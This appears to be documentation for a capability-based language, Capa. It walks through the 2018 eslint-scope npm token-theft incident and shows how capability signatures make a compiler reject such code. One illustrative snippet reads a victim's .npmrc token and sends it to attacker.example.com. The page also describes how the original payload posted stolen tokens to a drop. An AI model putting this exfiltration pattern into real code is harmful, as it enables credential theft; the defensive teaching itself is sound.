# Capa would have caught: the eslint-scope npm credential-theft incident

A concrete walkthrough of how Capa's capability discipline structurally
prevents the class of supply-chain attack that hit the npm package
`eslint-scope` on 12 July 2018.

> The full runnable Capa side of this writeup is in
> [`examples/cve_eslint_scope.capa`](../examples/cve_eslint_scope.capa).

---

## What happened

`eslint-scope` is a small npm package, ~3 million weekly downloads at
the time of the incident, used internally by [ESLint][eslint] to
build the scope chain of a JavaScript program. It is a pure
**AST analysis library**: given an abstract syntax tree, return a
data structure that says which names are bound in which lexical
scopes. It has no business reading files, no business reaching the
network, no business looking at environment variables.

On 12 July 2018 the npm credentials of one of the maintainers of
`eslint-scope` were compromised. Within roughly 40 minutes the
attacker had published [`eslint-scope@3.7.2`][advisory] to the
public registry. The malicious version's bundled code ran on
`require('eslint-scope')` (not via a postinstall script, but as
plain JavaScript at module-init time) and did the following:

1. Read the user's `~/.npmrc` to find the `_authToken` value that
   `npm publish` uses to authenticate.
2. POSTed the token to a Pastebin-hosted drop the attacker
   controlled.
3. Overwrote its own malicious entry point with the legitimate
   version of the file to hide the evidence on subsequent imports.

About 9 hours of exposure before npm caught it. The stolen tokens
were the immediate target, the attack was a *bridgehead* aimed at
publishing further malicious packages under accounts the auditor
trusts. Several follow-on attempts on other packages were detected
and blocked.

Primary sources:

- [npm Inc. post-mortem (Adam Baldwin, 12 Jul 2018)][advisory]
- [ESLint's own incident write-up][eslint-postmortem]
- [Snyk advisory][snyk]

[eslint]: https://eslint.org
[advisory]: https://github.blog/changelog/2018-07-12-postmortem-for-malicious-packages-published-on-july-12th-2018/
[eslint-postmortem]: https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes/
[snyk]: https://security.snyk.io/vuln/npm:eslint-scope:20180712

---

## The anatomy of the attack

The technical content of the attack was unremarkable. The two
operations that did the damage were `fs.readFileSync('~/.npmrc')`
and `https.request({ method: 'POST', ... })`. Both are one-line
calls in standard Node.js. The point is not that the code was
sophisticated; the point is that **the language let a scope
analyser do them**. There was nothing in the function signature of
`escope.analyze` that said "this function is allowed to read disk
and reach the network". The npm audit had been "yes, this is a
JavaScript AST library; it analyses scopes". The signature gave
the auditor zero leverage because the language had no notion of
what a function was allowed to touch.

What enabled the attack was **ambient authority**. In JavaScript,
Python, Ruby, Go, Java, C#, and almost every mainstream language,
any code that runs has the same baseline access as any other code
in the process:

- It can read environment variables.
- It can open files.
- It can open network sockets.

A function that *claims* to be a pure AST analyser is bytewise
indistinguishable from a function that *also* exfiltrates secrets.
Both compile, both run, both pass code review unless the reviewer
manually reads every line of every dependency on every update.

---

## The Capa version

Here is a miniature scope analyser in Capa
([cve_eslint_scope.capa](../examples/cve_eslint_scope.capa)):

```capa
type DeclKind =
    DeclLet
    DeclVar
    DeclConst

type Decl {
    name: String,
    kind: DeclKind
}

type Binding {
    name: String,
    scope_index: Int,
    kind: DeclKind
}

fun analyse_scopes(program: List<Decl>) -> List<Binding>
    ...
```

Run it:

```bash
$ capa --run examples/cve_eslint_scope.capa
scope analysis produced 3 bindings:
  - let x in scope #0
  - const API_URL in scope #0
  - var config in scope #0
```

The point, as in the event-stream walkthrough, is the **signature**,
not the body. `analyse_scopes` takes a `List<Decl>` and returns a
`List<Binding>`. There is no `Fs` parameter, no `Net`, no `Env`,
no `Unsafe`. None of those names is in scope inside the function
body. Any attempt to use them is rejected at compile time.

## What an attacker would try

The malicious eslint-scope payload, transliterated into Capa, would
need to look like this:

```capa
fun analyse_scopes(program: List<Decl>) -> List<Binding>
    // === Attack attempt: read ~/.npmrc, POST the token. ===
    let npmrc = fs.read("/home/victim/.npmrc")
    let _ = net.get("https://attacker.example.com/drop?t=${npmrc}")
    // === Continue with the legitimate analysis. ===
    ...
```

And here is what the analyzer says when you try to compile it:

```
error: undefined name 'fs'
   2 |     let npmrc = fs.read("/home/victim/.npmrc")
                       ^

error: undefined name 'net'
   3 |     let _ = net.get("https://attacker.example.com/drop?t=${npmrc}")
                   ^
```

There is no escape hatch. The function has no `fs` and no `net`
because its signature did not request them. To make the attack go
through, the attacker would have to widen the signature itself:

```capa
fun analyse_scopes(fs: Fs, net: Net, program: List<Decl>) -> List<Binding>
    // now compiles, but...
```

…and **every caller of `analyse_scopes`** would now have to thread
an `Fs` and a `Net` capability into a function that previously
needed nothing. ESLint, every plugin, every linting wrapper, every
CI configuration. That change is **loud**: it appears in pull
requests, in code-review diffs, in `--cyclonedx` SBOM output, in
any policy-based auditor reading the SBOM (see
[`examples/sbom_capability_audit.capa`](../examples/sbom_capability_audit.capa)).

That is the entire point of the discipline: not that any
particular line of malicious code becomes impossible to write, but
that the *attempt* is forced into a place where it cannot hide.

---

## What attenuation adds on top

Even if a library legitimately needs `Fs` (e.g. to read user-supplied
config files), the caller can hand it a *narrowed* `Fs` rather than
the full one:

```capa
fun main(stdio: Stdio, fs: Fs)
    let project_only = fs.restrict_to("/home/user/myproject/")
    let bindings = analyse_scopes(project_only, program)
    // ...
```

A function holding `project_only` cannot read `~/.npmrc`. The
`Fs.restrict_to` operation is itself sound: chaining
`a.restrict_to("X").restrict_to("Y")` gives the intersection of
the two prefix sets, never the union. Authority can only narrow,
never widen. See
[`examples/fs_env_attenuation.capa`](../examples/fs_env_attenuation.capa)
for the full pattern.

---

## Why this matters, beyond one incident

Credential exfiltration is one of the **two** most common
supply-chain attack shapes in modern package ecosystems (the other
being cryptocurrency-wallet drain, as in event-stream).
Recent examples that follow the same pattern:

- **rest-client (Ruby, 2019)**, malicious gem version uploaded
  arbitrary process memory, including AWS credentials, to a
  remote server.
- **PyTorch nightly torchtriton (2022)**, typosquat that
  exfiltrated `$HOME`, hostname, IP address, environment
  variables, and SSH keys.
- **node-ipc (2022)**, maintainer-injected code that, on hosts
  geolocated to Russia and Belarus, wiped files. Different motive,
  same enabling condition: ambient `Fs` authority.
- **xz-utils (CVE-2024-3094, 2024)**, multi-stage backdoor in a
  compression utility, would have given SSH-level access on every
  systemd host using `liblzma`.

Every one of these relied on **ambient authority** as the enabling
condition. The malicious code lived inside a library that had no
business doing what it was doing, but the language gave it
permission by default.

For organisations that have to comply with the **EU Cyber
Resilience Act** (in force December 2027), the auditor's question
"which component is allowed to do what?" has no good answer in
ambient-authority languages today. It has a mechanical answer in
Capa: read the signatures, derive the
[capability manifest](../docs/manifest.html), diff it against
the policy. The pipeline closes by construction; see
[`docs/positioning.md`](positioning.md) for the wider comparison.

---

## What Capa does *not* solve

The same honest limits as the event-stream walkthrough apply:

- **A capability holder with bad intent is still dangerous.** If
  a library legitimately needs `Fs` and the maintainer ships a
  malicious version, Capa cannot distinguish a legitimate read
  from a malicious one. The discipline narrows *where* attacks
  can hide; it does not eliminate trust entirely. Attenuation
  reduces the blast radius further.
- **The Python interop boundary (`py_import` / `py_invoke`) is
  still a risk.** Anything that crosses into Python via `Unsafe`
  loses Capa's guarantees. The boundary is explicit (you cannot
  cross it without an `Unsafe` parameter, and `Unsafe` appears
  in the SBOM), but the loss is real.
- **Capa is not a sandbox.** A determined attacker with
  process-level access can still do things the language cannot
  prevent. Capa raises the bar at the *source* level, where most
  supply-chain attacks live.

---

## Run it yourself

```bash
# The safe version (compiles and runs):
capa --run examples/cve_eslint_scope.capa

# The attack version (rejected by the analyzer): copy the
# malicious analyse_scopes from above into a file, run --check,
# observe the "undefined name" errors.
```
